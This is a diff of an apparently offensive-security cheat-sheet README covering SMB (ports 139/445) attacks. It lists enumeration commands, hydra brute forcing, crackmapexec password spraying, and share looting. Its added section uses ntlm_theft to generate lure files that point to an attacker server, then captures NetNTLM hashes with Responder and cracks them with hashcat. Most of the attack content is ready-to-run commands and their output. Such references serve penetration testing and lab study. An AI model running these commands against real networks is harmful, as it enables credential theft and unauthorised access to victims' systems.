@@ -382,13 +382,13 @@ nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.0.0.1
 ```
 
 ## 🔻Port 139, 445
-#### Basic enumeration
+#### ➤ Basic enumeration
 ```
 enum4linux -A 10.0.0.1
 enum4linux 10.0.0.1 -u anonymous
 ```
 
-#### List nmap scripts - Detection vuln port 445,139
+#### ➤ List nmap scripts - Detection vuln port 445,139
 ```
 
 nmap -p 445,139 -Pn --script smb-protocols.nse 10.0.0.1
@@ -405,7 +405,7 @@ nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.0.0.1
 
 ```
 
-#### Connection attempt
+#### ➤ Connection attempt
 ```
 smbclient -L \\10.0.0.1
 smbclient -L 10.0.0.1 -U anonymous
@@ -415,7 +415,7 @@ smbclient \\\\10.10.155.41\\<share_name>
 smbclient \\\\10.10.155.41\\<share_name> -U username
 ```
 
-#### SMBClient - download everything for what we have permission
+#### ➤ SMBClient - download everything for what we have permission
 ```
 #Be careful to access a folder that you are minumum a read only permission. (check with smbmap before)
 #In the example below, HR is a folder with read only permission
@@ -439,7 +439,7 @@ STATUS_STOPPED_ON_SYMLINK listing \*
 smb: \All Users\> 
 ```
 
-#### SMBmap List the rights on the folders / recursif mode
+#### ➤ SMBmap List the rights on the folders / recursif mode
 ```
 smbmap -H 10.0.0.1
 
@@ -459,7 +459,7 @@ smbmap -H 10.10.0.1 --download '.\Users\SVC_TGS\Desktop\user.txt'
 smbmap -H 10.0.0.1 -R -u ‘123’
 ```
 
-#### NXC
+#### ➤ NXC
 ```
 #Null session :
 nxc smb ./hosts.txt -u '' -p '' --shares
@@ -531,18 +531,18 @@ SMB         10.1.135.73     445    DC01             [-] WELCOME.local\RH:Il0vemy
 SMB         10.1.135.73     445    DC01             [-] WELCOME.local\HelpDesk:Il0vemyj0b2025! STATUS_LOGON_FAILURE 
 ```
 
-#### Detection of the SMB version using Wireshark
+#### ➤ Detection of the SMB version using Wireshark
 ```
 If the following error appear "protocol negotiation failed : NT_STATUS_CONNECTION_DISCONNECTED", it's probably due to the old smb version of the victim.
 Solution: Intercept the trafic of the command ‘smbclient -L \\<IP> with wireshark and search the negotiation of the smb version.
 ```
 
-#### Access through the kali folder
+#### ➤ Access through the kali folder
 ```
 smb://<ip>/<folder>
 ```
 
-#### Download a share folder
+#### ➤ Download a share folder
 ```
 #Example with the folder named anonymous
 smbget -R smb://10.0.0.1/anonymous
@@ -552,13 +552,13 @@ smbget -r smb://10.0.0.1/folder/file
 press enter
 ```
 
-#### Mount a share folder
+#### ➤ Mount a share folder
 ```
 mount -t cifs //10.0.0.1/share /mnt/share
 mount -t cifs -o "username=user,password=password" //10.0.0.1/share /mnt/share
 ```
 
-#### User enumeration using SID
+#### ➤ User enumeration using SID
 
 Lookupsid is a tool that allows you to enumerate user and group Security Identifiers (SIDs) on a Windows system. Each user and group account in Windows has a unique SID, and by obtaining these SIDs, you can gather valuable information about the system's user accounts, aiding in understanding the network's structure and potential security risks. The tool uses the SMB (Server Message Block) protocol, which is commonly used for Windows networking, to facilitate communication.
 
@@ -579,13 +579,13 @@ Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its af
 1601: MYWINDOWS\Kiosec (SidTypeUser)
 ```
 
-#### Bruteforce
+#### ➤ Bruteforce
 ```
 hydra -L users.txt -P passs.txt smb://10.0.0.1 -t 4
 hydra -L username.txt -P password.txt 10.0.0.1 smb -V
 ```
 
-#### Password Spraying
+#### ➤ Password Spraying
 ```
 crackmapexec smb <IP> -d <DOMAIN> -u users.txt -p 'PASSWORD'
 → EX: crackmapexec smb 10.0.0.1 -d frabricorp -u users.txt -p '123Soleil'
@@ -594,7 +594,7 @@ STATUS_PASSWORD_MUST_CHANGE : correct password but has expired and needs to be c
 STATUS_LOGIN_FAILURE : incorrect password
 ```
 
-#### URI Attack
+#### ➤ URI Attack
 ```
 ➤ Prerequisite : Write access to a smb folder
 Check if is it possible to write in a folder
@@ -630,11 +630,9 @@ kiosec::CYBERLAB:09de3ec911a58870:0D4F3A68A10DAADDF7B4382A16916822:0101000000000
 See : https://github.com/Kiosec/Cracking/blob/main/README.md#netntlmv2ntlmv2-hash
 ```
 
-#### Slinky Attack
+#### ➤ Slinky Attack
 
-##### Using ntml_left
-
-##### Using NXC
+###### Using NXC
 ```
 # I don't know why, but nxc attack is less viable than ntm-left.
 # Step01: Upload a malicious lst file on the smb share
@@ -657,6 +655,34 @@ SLINKY      10.0.23.134     445    DC01             [+] Created LNK file on the 
 # Step 02: Open a responder listener on the network and wait that a user open the .lst file in order to obtain the hash.
 
 # Step 03: Try to crack the hash
+──(root㉿kali)-[/home/kali]
+└─# hashcat -a 0 -m 5600 hash.txt rockyou.txt 
+```
+
+###### Using ntml_left
+```
+#Step 01: Create the malicious file
+# ntlm_thef provide a large type of files 
+──(kali㉿kali)-[~/Downloads/ntlm_theft-master]
+└─$ python3 ntlm_theft.py --verbose --generate modern --server 10.200.44.147 --filename "sharethepain"
+/home/kali/Downloads/ntlm_theft-master/ntlm_theft.py:168: SyntaxWarning: invalid escape sequence '\l'
+  location.href = 'ms-word:ofe|u|\\''' + server + '''\leak\leak.docx';
+Skipping SCF as it does not work on modern Windows
+Created: sharethepain/sharethepain-(url).url (BROWSE TO FOLDER)
+Created: sharethepain/sharethepain-(icon).url (BROWSE TO FOLDER)
+Created: sharethepain/sharethepain.lnk (BROWSE TO FOLDER)
+<...>
+Generation Complete.
+
+┌──(kali㉿kali)-[~/Downloads/ntlm_theft-master/sharethepain]
+└─$ ls
+ sharethepain.application           'sharethepain-(frameset).docx'   sharethepain.htm                      sharethepain.jnlp         sharethepain.m3u                      sharethepain.rtf                'sharethepain-(url).url'
+ sharethepain.asx                   'sharethepain-(fulldocx).xml'   'sharethepain-(icon).url'              sharethepain.library-ms   sharethepain.pdf                     'sharethepain-(stylesheet).xml'   sharethepain.wax
+'sharethepain-(externalcell).xlsx'  'sharethepain-(handler).htm'    'sharethepain-(includepicture).docx'   sharethepain.lnk         'sharethepain-(remotetemplate).docx'   sharethepain.theme
+                    
+# Step 03: Open a responder listener on the network and wait that a user open the .lst file in order to obtain the hash.
+
+# Step 04: Try to crack the hash
 ──(root㉿kali)-[/home/kali]
 └─# hashcat -a 0 -m 5600 hash.txt rockyou.txt 
 ```
